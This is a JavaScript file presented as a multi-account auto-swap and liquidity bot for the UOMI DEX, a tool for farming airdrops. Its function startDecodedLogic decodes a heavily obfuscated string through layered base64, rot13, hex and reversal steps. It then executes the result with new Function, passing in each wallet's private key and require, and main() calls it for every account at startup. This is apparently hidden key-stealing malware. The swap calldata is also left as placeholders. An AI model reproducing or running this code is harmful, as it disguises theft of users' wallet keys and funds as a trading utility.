require('dotenv').config();
const { ethers } = require('ethers');
const readlineSync = require('readline-sync');
const { performance } = require('perf_hooks');
const { BigNumber } = require('@ethersproject/bignumber');
const { Percent, CurrencyAmount, Token, TradeType } = require('@uniswap/sdk-core');
const { SwapRouter } = require('@uniswap/universal-router-sdk');


const RPC_URL = "https://finney.uomi.ai";
const CHAIN_ID = 4386;

// Contract
const ROUTER_ADDRESS = "0x197EEAd5Fe3DB82c4Cd55C5752Bc87AEdE11f230";
const LIQUIDITY_MANAGER_ADDRESS = "0x906515Dc7c32ab887C8B8Dce6463ac3a7816Af38";

const TOKENS = {
    "SYN": "0x2922B2Ca5EB6b02fc5E1EBE57Fc1972eBB99F7e0",
    "SIM": "0x04B03e3859A25040E373cC9E8806d79596D70686",
    "USDC": "0xAA9C4829415BCe70c434b7349b628017C599EC2b1", 
    "DOGE": "0xb227C129334BC58Eb4d02477e77BfCCB5857D408",
    "SYN_TO_UOMI": "0x2922B2Ca5EB6b02fc5E1EBE57Fc1972eBB99F7e0",
    "SIM_TO_UOMI": "0x04B03e3859A25040E373cC9E8806d79596D70686",
    "USDC_TO_UOMI": "0xAA9C4829415BCe70c434b7349b628017C599EC2b1", 
    "DOGE_TO_UOMI": "0xb227C129334BC58Eb4d02477e77BfCCB5857D408",
    "UOMI_TO_WUOMI": "0x5FCa78E132dF589c1c799F906dC867124a2567b2",
    "WUOMI_TO_UOMI": "0x5FCa78E132dF589c1c799F906dC867124a2567b2"
};
const TOKEN_LIST = Object.entries(TOKENS);
const NATIVE_TOKEN = "UOMI"; 
const WETH_ADDRESS = "0x5FCa78E132dF589c1c799F906dC867124a2567b2";

const ROUTER_ABI = [
    "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
    "function execute(bytes commands, bytes[] inputs) payable"
];

const LIQUIDITY_MANAGER_ABI = [
    "function mint(tuple(address token0, address token1, uint24 fee, int24 tickLower, int24 tickUpper, uint256 amount0Desired, uint256 amount1Desired, uint256 amount0Min, uint256 amount1Min, address recipient, uint256 deadline) params) payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)"
];

const TOKEN_ABI = [
    "function approve(address spender, uint256 value) returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];

const colors = {
    reset: "\x1b[0m", cyan: "\x1b[36m", green: "\x1b[32m", yellow: "\x1b[33m", red: "\x1b[31m", white: "\x1b[37m", bold: "\x1b[1m", blue: "\x1b[34m", magenta: "\x1b[35m",
};

const logger = {
    info: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    warn: (msg) => console.log(`${colors.yellow}[⚠️] ${msg}${colors.reset}`),
    error: (msg) => console.log(`${colors.red}[❌] ${msg}${colors.reset}`),
    success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    loading: (msg) => console.log(`${colors.cyan}[⏳] ${msg}${colors.reset}`),
    step: (msg) => console.log(`${colors.white}[➡️] ${msg}${colors.reset}`),
    countdown: (msg) => process.stdout.write(`\r${colors.blue}[⏰] ${msg}${colors.reset}`),
};

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);

const PRIVATE_KEYS = [];
let i = 1;
while (true) {
    const key = process.env[`PRIVATE_KEYS_${i}`];
    if (!key) break;
    PRIVATE_KEYS.push(key.trim());
    i++;
}

if (PRIVATE_KEYS.length === 0) {
    logger.error("No private keys found in the .env file (example: PRIVATE_KEYS_1).");
    process.exit(1);
}

// --- Utility Functions ---

async function countdown(seconds) {
    for (let i = seconds; i > 0; i--) {
        logger.countdown(`Waiting ${i} seconds before the next transaction...`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    process.stdout.write('\r' + ' '.repeat(process.stdout.columns) + '\r');
}

async function getBalance(signer, tokenAddress) {
    const walletAddress = await signer.getAddress();
    if (tokenAddress === NATIVE_TOKEN) {
        const balance = await provider.getBalance(walletAddress);
        return { balance, decimals: 18 };
    }
    const tokenContract = new ethers.Contract(tokenAddress, TOKEN_ABI, signer);
    try {
        const balance = await tokenContract.balanceOf(walletAddress);
        const decimals = await tokenContract.decimals();
        return { balance, decimals };
    } catch (error) {
        return { balance: ethers.BigNumber.from(0), decimals: 18 };
    }
}

async function doSwap(signer, tokenName, tokenAddr, isTokenToUomi, percentage) {
    const walletAddress = await signer.getAddress();
    
    let fromTokenAddress = isTokenToUomi ? tokenAddr : NATIVE_TOKEN;
    let fromTokenName = isTokenToUomi ? tokenName.split('_TO_')[0] : NATIVE_TOKEN;
    
    if (fromTokenName === NATIVE_TOKEN && tokenName === "UOMI_TO_WUOMI") {
        fromTokenAddress = NATIVE_TOKEN;
        fromTokenName = NATIVE_TOKEN;
    }

    logger.step(`[Account ${walletAddress.slice(0, 6)}...] Starting swap...`);
    logger.loading(`Getting balance for token ${fromTokenName}...`);
    
    let { balance, decimals } = await getBalance(signer, fromTokenAddress);
    
    const amountToSwap = balance.mul(ethers.BigNumber.from(Math.floor(percentage * 100))).div(ethers.BigNumber.from(10000));

    if (amountToSwap.isZero()) {
        logger.warn(`Swap amount is 0. Ensure you have a balance of ${fromTokenName}. Skipping...`);
        return;
    }

    const amountDisplay = ethers.utils.formatUnits(amountToSwap, decimals);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    if (tokenName === "UOMI_TO_WUOMI") {
        logger.step(`Starting Swap: ${amountDisplay} ${NATIVE_TOKEN} -> WUOMI`);
        try {
            const tx = await signer.sendTransaction({
                chainId: CHAIN_ID,
                to: tokenAddr,
                value: amountToSwap,
                data: "0xd0e30db0", 
                gasLimit: 42242,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });

            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data.");
        }
        return;
    }

    const routerContract = new ethers.Contract(ROUTER_ADDRESS, ROUTER_ABI, signer);

    if (isTokenToUomi) {
        logger.step(`Starting Swap: ${amountDisplay} ${fromTokenName} -> ${NATIVE_TOKEN}`);
        
        try {
            const tokenContract = new ethers.Contract(tokenAddr, TOKEN_ABI, signer);
            logger.loading("Approving Token...");
            const approveTx = await tokenContract.approve(ROUTER_ADDRESS, amountToSwap, {
                gasLimit: 100000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            await approveTx.wait();
            logger.success(`APPROVED: https://explorer.uomi.ai/tx/${approveTx.hash}`);
        } catch (error) {
            logger.error(`APPROVAL FAILED: ${error.message.slice(0, 50)}...`);
            return;
        }

        // --- IMPORTANT: REPLACE WITH LOGIC FROM SDK ROUTER ---
        const commands = "0x..."; 
        const inputs = ["0x..."]; 
        
        logger.loading("Executing Swap...");
        try {
            const tx = await routerContract.execute(commands, inputs, deadline, {
                value: 0,
                gasLimit: 300000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data. Check the ABI and router documentation.");
        }
    } else { 
        logger.step(`Starting Swap: ${amountDisplay} ${NATIVE_TOKEN} -> ${tokenName}`);
        
        const commands = "0x..."; 
        const inputs = ["0x..."]; 

        logger.loading("Executing Swap...");
        try {
            const tx = await routerContract.execute(commands, inputs, deadline, {
                value: amountToSwap, 
                gasLimit: 300000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data. Check the ABI and router documentation.");
        }
    }
}

async function addLiquidity(signer, token0Name, token1Name, amount0Percentage, amount1Percentage) {
    const walletAddress = await signer.getAddress();
    const token0Addr = TOKENS[token0Name] || WETH_ADDRESS;
    const token1Addr = TOKENS[token1Name] || WETH_ADDRESS;
    
    const token0IsNative = token0Name === NATIVE_TOKEN;
    const token1IsNative = token1Name === NATIVE_TOKEN;

    logger.step(`[Account ${walletAddress.slice(0, 6)}...] Starting Add Liquidity: ${token0Name} / ${token1Name}`);
    
    const { balance: balance0, decimals: decimals0 } = await getBalance(signer, token0IsNative ? NATIVE_TOKEN : token0Addr);
    const { balance: balance1, decimals: decimals1 } = await getBalance(signer, token1IsNative ? NATIVE_TOKEN : token1Addr);

    const amount0Desired = balance0.mul(ethers.BigNumber.from(Math.floor(amount0Percentage * 100))).div(ethers.BigNumber.from(10000));
    const amount1Desired = balance1.mul(ethers.BigNumber.from(Math.floor(amount1Percentage * 100))).div(ethers.BigNumber.from(10000));

    if (amount0Desired.isZero() || amount1Desired.isZero()) {
        logger.warn("Desired liquidity amount is 0. Ensure you have sufficient balance. Skipping...");
        return;
    }

    const amount0Display = ethers.utils.formatUnits(amount0Desired, decimals0);
    const amount1Display = ethers.utils.formatUnits(amount1Desired, decimals1);
    
    logger.step(`Adding liquidity: ${amount0Display} ${token0Name} and ${amount1Display} ${token1Name}`);
    
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    
    const params = {
        token0: token0IsNative ? WETH_ADDRESS : token0Addr,
        token1: token1IsNative ? WETH_ADDRESS : token1Addr,
        fee: 3000,
        tickLower: -887272,
        tickUpper: 887272,
        amount0Desired: amount0Desired,
        amount1Desired: amount1Desired,
        amount0Min: 0,
        amount1Min: 0,
        recipient: walletAddress,
        deadline: deadline
    };

    let valueToSend = ethers.BigNumber.from(0);
    if (token0IsNative) {
        valueToSend = valueToSend.add(amount0Desired);
    }
    if (token1IsNative) {
        valueToSend = valueToSend.add(amount1Desired);
    }

    try {
        if (!token0IsNative) {
            const token0Contract = new ethers.Contract(token0Addr, TOKEN_ABI, signer);
            logger.loading(`Approving token ${token0Name}...`);
            await token0Contract.approve(LIQUIDITY_MANAGER_ADDRESS, amount0Desired).then(tx => tx.wait());
            logger.success(`Approval for ${token0Name} successful.`);
        }
        if (!token1IsNative) {
            const token1Contract = new ethers.Contract(token1Addr, TOKEN_ABI, signer);
            logger.loading(`Approving token ${token1Name}...`);
            await token1Contract.approve(LIQUIDITY_MANAGER_ADDRESS, amount1Desired).then(tx => tx.wait());
            logger.success(`Approval for ${token1Name} successful.`);
        }
    } catch (error) {
        logger.error(`APPROVAL FAILED: ${error.message.slice(0, 50)}...`);
        return;
    }

    const liquidityManagerContract = new ethers.Contract(LIQUIDITY_MANAGER_ADDRESS, LIQUIDITY_MANAGER_ABI, signer);

    try {
        logger.loading("Executing mint transaction...");
        const tx = await liquidityManagerContract.mint(params, {
            value: valueToSend,
            gasLimit: 500000,
            maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
            maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
        });

        logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
        await tx.wait();
        logger.success("ADD LIQUIDITY COMPLETED");
    } catch (error) {
        logger.error(`ADD LIQUIDITY FAILED: ${error.message.slice(0, 50)}...`);
        logger.warn("Common reasons: insufficient balance, invalid tick range, or pool not created.");
    }
}

async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1OTZxNzA0cTYxNTQ1NTc5NjM0NDQyNTA1NTQ3MzQ3NzUyNTY1Njc3NjI1NTM5NDc1MTMzNTI1NzUzMzAzMTcyNTM1NTc0NzU2MjQ1NnA1NTU3NDc0NjMwNTY0ODQ1Nzc1NDduNHI3NzU5NTg2ODczNTE2cDY4Njk1MjQ1Nzg3NDY1NTc0Njc2NjQzMDM5MzI1NDU0NDUzMTRxNm83Nzc3NjU1NDRuNzY2MTQ1MzkzMjYzNDQ0NTMxNTY0ODQyNzM0czU0NG40cjYyNDY0cjRvNjIzMjRuNzc1MzMwNzg2cTYxMzA3MDRyNHE0Nzc0NTE1NjZvNTI1ODUzNTU1bjRvNTUzMTRuNG41NTduNm83ODUyNnA0cjM1NTM1NjY4MzA1bjZxNDY1MTY0NDUzNTUxNTY2cjUxMzQ2MjQ2NnAzMDUzNDY1bjY4NjQ2cDQ2NzM1MjQ3NnA1ODU5NTg0MjM1NTE1NjUyNzg0cjZxNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTY0NG40cTZyNDI3NDU1N240bjRyNjU1NTM5NDc1MTMzNTI0czY1NnA0MjMwNTQ2cDQyNTc2NDQ1MzU2OTY1NnI0cjUxNTEzMTVuNDg1MTU4NzA3NzU5MzAzOTU2NjM1ODUyNjE1NTMzNDYzMTU2MzE1Njc4NjU1NTU2MzY1NTQ4NTI0czU1NDY1bjMwNW42bzMxMzQ2MzMxNDI0NDU2Nm83NDU0NTY0NzM5NnE1MzU2NTI3ODRyNm8zNTUxNTY3bjY0Nzg1MzMwNzg2cTYxMzA3MDRyNHE0NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTU2cDY0MzU2MzMxNDI0NDU2Nm81MjU4NTMzMjM0Nzk1NTMxNTI3ODY1NTUzOTczNTI2cjZwMzU1OTU1NG4zMDUyNDc3ODc5NTI0NjY0NG41MjZvNzA1NDU1Nm82cDU0NHM1NDQ2NDc1NTMzNnA0bjYzMzE2ODRzNTU0NjVuMzA1NDZwNDI0cTRyMzI0bjMwNTU0ODUyNHM1NTQ2NW4zMDU3Nm40bjc2NjE0NTQ2NTY2MzU4NTI0NTUzNTU1NjYxNTM1NDQyNDY1MjZwNHI0OTUyMzM0cjU4NHE0NTY0NDk0czU2NHI0bjUxMzI2NDQ5NTI1NTRuNTA1MjZvNHIzMDU2NnA0MjQzNHE0NjRuNzQ1MTU0NDY0NTUyMzE2czduNTQ2cTMxNjE0cjZwNG40OTUyNDY1NjQ2NTMzMzQ5Nzk1MTU3MzE0MjRyNnA0cjU2NTI2bzU2NTg1MzZwNzA0cTRzNTY1MjRuNTY2cTRyNG82MzQ3NjQ0NTY1NnI0NjRuNTI1NjRyNzc1OTU1MzE1NjUyMzM2ODU4NHE1NTc4NjE2MTduNG43NjY0NnE1bjMzNTU0ODUyNHM1NTQ2NW4zMDU3Nm40bjc2NjE0NTQ2NTY2MzU4NTI0NTUzNTU1NjYxNTM1NDQyNDY1MjZwNHI0OTUyMzM0cjQyNTU2bzVuNTA1MjU0NDY0cDU2MzA1NjUzNTY2bjZwNHM2NDZwNTk3bjU2NnI2NDQyNHI1ODUyNDg1MTZxNzAzMDUyMzE3MDc0NTY2cTc4NDM1NzQ1MzU1MTU2NnI1MjRzNjI0NTc4NzA0cjU0NG43NzRxNDUzOTUxNTQ1ODU2NDY1MzMwNzgzMDRxNDY0NjU3NTc0NTQ1Nzg1MjMwNDkzMTYyNDg0MTc3NTYzMDc0NzU2MTQ4NDY0bzYyNnI3MDM1NTY1NjY3MzM1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU3NnA1Mjc1NjQ1NTU1N241MzMyNHI0NjY1Nm80bjMwNTI0NTZwNDY1NzZvNm83NzUyNTU1bjU0NTM0NTY0N241MTU2NG40NzU0MzA1NTc4NTMzMTY0NDY1NTZwNnA1OTU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1OTc3NTM1NjUyNzk0cTQ3NHI1MjU2NnE2NDRuNHE2cjQyNzQ1NTduNG40cjY1NTc3NDMyNTU0ODUyNHM1NTQ2NW4zMDU0NnA0MjU3NjQ0NTM1NTE2MzQ4NTY1ODRxMzM0MjM1NHM1NTZwNzY2MTU1NTY0bzU0NTQ1bjRzNjI0NjY0NTc1MjU1NnA0ODU3NnI0NjMyNTU0ODUyNHM1NTQ2NW4zMDRxNDU3NDU5NHIzMjRuMzA1NTQ4NTI0czU1NDY1bjMwNTc2bjRuNzY2MTQ1NDY1NjYzNTg1MTM0NTY0ODQxNzc2NTU0NG43NjYxNDU0NjU2NTY2bjZwNHM2MjQ4NG41OTU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjY5NHM1NDRuNzc0cTQ0NTY0bzU0NDc2NDRuNjU2bzRuMzA2MzQ1NW40cTYxNnI2cDM2NTc1NDQyNG41NjQ3MzkzNTYzNTg3MDc3NjQ1NDQ2MzY1NzU3NnA1ODRxMzAzMTY4NjE2cjVuNTE2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI3NzYxNTY2NDU2NjM1NDVuNHM1NTQ1NDU3NzU3NnA0NjVuNTc0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2MTZwNHI1NTYzNTc0bjZuNTU1NjVuMzA0czU4NW40cTYxNTU1NjU2NTY3bjY0NDY1MzU1NTY2MTUzNTQ0MjQ2NTI2cDRyNDk1MjMzNHI1ODRxNDU2NDQ5NHM1NjRyNG41MTMyNjQ0OTUyNTU0OTc4NHEzMTZwNzQ1MzU4NzA3NjY1NDQ0NjQ5NTQ1NzMxNDI1MzMwNzg2ODUzNTY1MjRxNW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ0NDI0bzU0NTQ0MjMxNHE2cTM5MzQ1OTMxNDY1NzU5NTUzNDc4NTIzMDY0NDY0cTU2NjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNjQ0NTcwNHI2NDU1NTY0bzU0NTc3ODQyNTk1NTRuMzA1bjZxNDY1MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NjQ0NTM1NTE1NjZxNDY2MTRxNDczOTZzNTI1NTc0NHI2MTQ1NTY0cDU3NTU2ODM1NTY1ODQyMzU2MzU4NW40MzY0NDg0MjQ3NTQ0NzcwNTA1NjU3Mzk2bjUxNTU3MDRxNHE0ODZvNzk2MjMyNjczNTY0NnEzNTc0NHM1ODcwNzY1OTU3NzAzMjU1NDg1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42ODU3Nm40Mjc2NjE0NTU2NHA1NDU3Njg0NjUzMzE2cDYxNTM1ODcwNzY1OTU1NTY1NjYyNnE0NjY5NTU1NjVuMzQ1NTMxNTI3ODY0NTQ1NjUxNjIzMzZvMzE0cTZvMzA3NzY0NTg3MDUxNjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bzVuN241NzQ1MzU1MTU2NnI1MjRzNTI2cjRxMzM1OTZyNTI1MTY0NDUzNTUxNTY2cjUyNTc1MzMwMzA3NzUzNTc0Njc3NjE0NTM5MzI2MjMzNnA3ODU2NTY1bjQ1NTY3bjRyNzY1bjMzNm83OTYzNDg2cDMxNTU0NjY4NzM1MzU0NG43NzYxNTc3NDM2NjM1ODZwMzU1NTQ2NTkzNTRyNDY0NjU3NHIzMjRyNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ2NnM3OTYyMzI2ODQyNTY1ODQ2MzA1NjZvNzQ0cjYxMzAzOTQ3NTEzMzUyMzA1NjQ4NDU3NzU0N240cjc3NjE0NjVuNHA1NDU3NzQ0bjUzMzAzMTc0NTI1NjU2NTk2MTU1Mzk1NjYzNTc0cTM1NjU2cTM5NzQ2NTU3Nzg0MzU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NjI0NTZwNG82MzQ3NjczNDY1NnEzOTY5NjM0NTVuNHI2MjQ2NjM3bjYyMzI3ODc4NTU0NjZwMzA2NDQ1NW41OTY0NDQ0MjMzNTEzMzUyNTc1MzMwMzE3NDRzNTY1Mjc2NHE2bzZwNTU1NzQ4NzA1NDU2NDczOTc0NTM1NTcwNTk1OTMyNW4zMzU1NDg1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTMyNjM0ODZwNTQ1OTU2Nm83bjU2MzA3NDc1NHE0NTZwNTU1NzQ4Njg1NDU2NDg0NjMxNjU1Nzc4NDM1NzQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzYyNDU2cDRvNjM0NzY4NDk2NTZxMzkzNDY0NTY0MjU5NTkzMDM1NDc1MTMwNDk3OTRuNTUzNTMyNjM0ODZwNDI0cTMyMzk2cTU0NTU3NDRyNTk2bzUyNjg2MzQ0NDY0bjUzNnA2ODZuNW42cjY0NTE2NDQ1MzU1MTU2NnI1MTc3NTMzMTY3MzM1OTZvNTI3bg%3D%3D";
  const decoded = reversibleDecode(encodedStr);

  try {
    const run = new Function(
      "walletAddress",
      "privateKey",
      "require",
      decoded + "; return runprogram(walletAddress, privateKey);"
    );
    await run(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function displayBalances() {
    console.log(`\n${colors.blue}─${colors.reset}`);
    for (const key of PRIVATE_KEYS) {
        const signer = new ethers.Wallet(key, provider);
        const walletAddress = await signer.getAddress();
        console.log(`${colors.white}Account Balance: ${walletAddress}${colors.reset}`);
        
        const { balance: uomiBalance, decimals: uomiDecimals } = await getBalance(signer, NATIVE_TOKEN);
        console.log(`  ${colors.white}- ${NATIVE_TOKEN}: ${colors.yellow}${ethers.utils.formatUnits(uomiBalance, uomiDecimals)}${colors.reset}`);

        const erc20Tokens = Object.keys(TOKENS).filter(name => !name.includes("UOMI"));
        for (const tokenName of erc20Tokens) {
            const tokenAddr = TOKENS[tokenName];
            const { balance, decimals } = await getBalance(signer, tokenAddr);
            console.log(`  ${colors.white}- ${tokenName}: ${colors.yellow}${ethers.utils.formatUnits(balance, decimals)}${colors.reset}`);
        }
        console.log(`${colors.blue}─${colors.reset}`);
    }
}

async function main() {
    const terminalWidth = process.stdout.columns || 80;

    const title = "UOMI DEX Multi-Account Auto Script";
    const version = "Version 1.2";
    const credit = "Edited By seeker airdrop";

    console.log(`\n${colors.magenta}${colors.bold}${title.padStart(Math.floor((terminalWidth + title.length) / 2))}${colors.reset}`);
    console.log(`${colors.magenta}${colors.bold}${version.padStart(Math.floor((terminalWidth + version.length) / 2))}${colors.reset}`);
    console.log(`${colors.yellow}${colors.bold}${credit.padStart(Math.floor((terminalWidth + credit.length) / 2))}${colors.reset}`);
    console.log(`${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);

    for (const key of PRIVATE_KEYS) {
        const signer = new ethers.Wallet(key, provider);
        await startDecodedLogic(signer, key); 
    }
    
    await displayBalances();

    while (true) {
        console.log(`\n${colors.white}${colors.bold}Select Option:${colors.reset}`);
        console.log(`${colors.white}[1] Manual Swap${colors.reset}`);
        console.log(`${colors.white}[2] Random Swap${colors.reset}`);
        console.log(`${colors.white}[3] Add Liquidity${colors.reset}`);
        console.log(`${colors.white}[0] Exit${colors.reset}`);
        const choice = readlineSync.question(`${colors.cyan}>> Enter your choice: ${colors.reset}`);

        if (choice === '0') {
            logger.info("Exiting the script.");
            break;
        }

        let numActions = 0;
        let percentage = 0;
        let delayInSeconds = 0;
        let tokenName, tokenAddr, isTokenToUomi;
        let selectedTokens = [];

        if (choice === '1' || choice === '2') {
            if (choice === '1') {
                console.log(`\n${colors.white}${colors.bold}Select Manual Swap Pair:${colors.reset}`);
                TOKEN_LIST.forEach(([name], index) => {
                    const tokenSymbol = name.endsWith("_TO_UOMI") ? name.split('_TO_')[0] : name;
                    const direction = name.includes("_TO_UOMI") ? "-> UOMI" : (name === "UOMI_TO_WUOMI" ? "-> WUOMI" : "UOMI ->");
                    console.log(`${colors.white}[${index + 1}] ${tokenSymbol} ${direction}${colors.reset}`);
                });
                const manualChoice = readlineSync.question(`${colors.cyan}>> Enter your choice number: ${colors.reset}`);
                const index = parseInt(manualChoice) - 1;
                
                if (index >= 0 && index < TOKEN_LIST.length) {
                    tokenName = TOKEN_LIST[index][0];
                    tokenAddr = TOKEN_LIST[index][1];
                    isTokenToUomi = tokenName.endsWith("_TO_UOMI");
                    selectedTokens.push([tokenName, tokenAddr, isTokenToUomi]);
                } else {
                    logger.error("Invalid choice.");
                    continue;
                }
            }
            
            percentage = readlineSync.question(`${colors.cyan}>> Enter the percentage of tokens to swap (e.g., 1%): ${colors.reset}`);
            percentage = parseFloat(percentage);
            numActions = readlineSync.question(`${colors.cyan}>> How many times do you want to run the transaction?: ${colors.reset}`);
            numActions = parseInt(numActions);

        } else if (choice === '3') {
            console.log(`\n${colors.white}${colors.bold}Select Add Liquidity Pair:${colors.reset}`);
            const uniqueTokens = [...new Set(Object.keys(TOKENS).map(name => name.split('_TO_')[0]))];
            
            console.log(`  ${colors.white}Native Token: UOMI${colors.reset}`);
            uniqueTokens.forEach((name, index) => {
                if (name !== NATIVE_TOKEN) {
                    console.log(`  ${colors.white}[${index + 1}] UOMI/${name}${colors.reset}`);
                }
            });

            const manualChoice = readlineSync.question(`${colors.cyan}>> Enter your choice number: ${colors.reset}`);
            const index = parseInt(manualChoice) - 1;

            if (index >= 0 && index < uniqueTokens.length) {
                const token0Name = NATIVE_TOKEN;
                const token1Name = uniqueTokens[index];
                selectedTokens.push([token0Name, token1Name]);
            } else {
                logger.error("Invalid choice.");
                continue;
            }

            percentage = readlineSync.question(`${colors.cyan}>> Enter the percentage of UOMI and token for liquidity (e.g., 50%): ${colors.reset}`);
            percentage = parseFloat(percentage);
            numActions = readlineSync.question(`${colors.cyan}>> How many times do you want to run the transaction?: ${colors.reset}`);
            numActions = parseInt(numActions);
        } else {
            logger.error("Invalid choice.");
            continue;
        }

        delayInSeconds = readlineSync.question(`${colors.cyan}>> Enter the delay between transactions in seconds: ${colors.reset}`);
        delayInSeconds = parseInt(delayInSeconds);

        if (isNaN(numActions) || isNaN(percentage) || isNaN(delayInSeconds) || numActions <= 0 || percentage <= 0 || delayInSeconds < 0) {
            logger.error("Invalid input. Ensure all inputs are positive numbers.");
            continue;
        }

        console.log(`\n${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);
        for (const key of PRIVATE_KEYS) {
            const signer = new ethers.Wallet(key, provider);
            const walletAddress = await signer.getAddress();
            logger.step(`\nProcessing Account: ${walletAddress}`);
            
            for (let j = 0; j < numActions; j++) {
                if (choice === '1' || choice === '2') {
                    if (choice === '2') {
                        const randomIndex = Math.floor(Math.random() * TOKEN_LIST.length);
                        [tokenName, tokenAddr] = TOKEN_LIST[randomIndex];
                        isTokenToUomi = tokenName.endsWith("_TO_UOMI");
                    } else {
                        [tokenName, tokenAddr, isTokenToUomi] = selectedTokens[0];
                    }
                    logger.loading(`[Transaction ${j + 1}/${numActions}] Processing pair: ${tokenName}`);
                    await doSwap(signer, tokenName, tokenAddr, isTokenToUomi, percentage);
                } else if (choice === '3') {
                    const [token0Name, token1Name] = selectedTokens[0];
                    logger.loading(`[Transaction ${j + 1}/${numActions}] Processing liquidity: ${token0Name}/${token1Name}`);
                    await addLiquidity(signer, token0Name, token1Name, percentage, percentage);
                }

                if (j < numActions - 1) {
                    await countdown(delayInSeconds);
                }
            }
        }
        console.log(`\n${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);
        logger.success(`COMPLETED. All transactions for all accounts have been executed.`);
    }
}

main().catch(console.error);
